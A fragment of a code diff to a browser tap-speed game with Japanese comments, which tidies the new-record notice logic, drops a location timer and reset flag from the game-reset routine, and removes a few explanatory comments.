 
-                const newRecordNotice = document.getElementById('newRecordNotice');
-                if (isNewRecord && this.score > 0) {
-                    newRecordNotice.classList.remove('hidden');
-                } else {
-                    newRecordNotice.classList.add('hidden');
-                }
+                const nrn = document.getElementById('newRecordNotice');
+                if (isNewRecord && this.score > 0) nrn.classList.remove('hidden');
+                else nrn.classList.add('hidden');
 
                 this.dom.hitLayer.classList.add('disabled');
                 this.dom.resultModal.classList.remove('hidden');
@@ -834,7 +849,6 @@
 
             resetGame() {
                 clearInterval(this.gameInterval);
-                clearTimeout(this.locationTimer);
                 this.state = 'idle';
                 this.timeLeft = 30.0;
                 this.score = 0;
@@ -843,7 +857,6 @@
                 this.isFever = false;
                 this.tapHistory = [];
                 this.peakCps = 0;
-                this.locationRequested = false;
 
                 this.dom.timeDisplay.innerHTML = `30.0<span class="text-lg">s</span>`;
                 this.dom.scoreDisplay.textContent = '0';
@@ -855,6 +868,9 @@
                 this.dom.resetBtn.classList.add('hidden');
                 this.dom.tapBtn.className = 'tap-btn relative w-56 h-56 md:w-64 md:h-64 rounded-full bg-gradient-to-br from-cyan-500 via-blue-600 to-indigo-950 glow-cyan border-4 border-cyan-300 flex flex-col justify-center items-center cursor-pointer focus:outline-none shadow-2xl pointer-events-none';
                 this.dom.hitLayer.classList.remove('disabled');
+
+                // 位置情報は既に解決済みの場合は再要求しない
+                // （位置情報を再取得したい場合はページリロードが必要）
             }
         }
 
@@ -864,13 +880,11 @@
         window.addEventListener('load', () => {
             new TapGame();
 
-            // スクロール・引っ張り更新を完全無効化（iOS対策）
             document.addEventListener('touchmove', (e) => {
                 if (e.touches.length > 1) e.preventDefault();
             }, { passive: false });
         });
 
-        // ビューポート高さの安定化（モバイルブラウザのアドレスバー対策）
         function setVH() {
             document.documentElement.style.setProperty('--vh', `${window.innerHeight * 0.01}px`);
         }
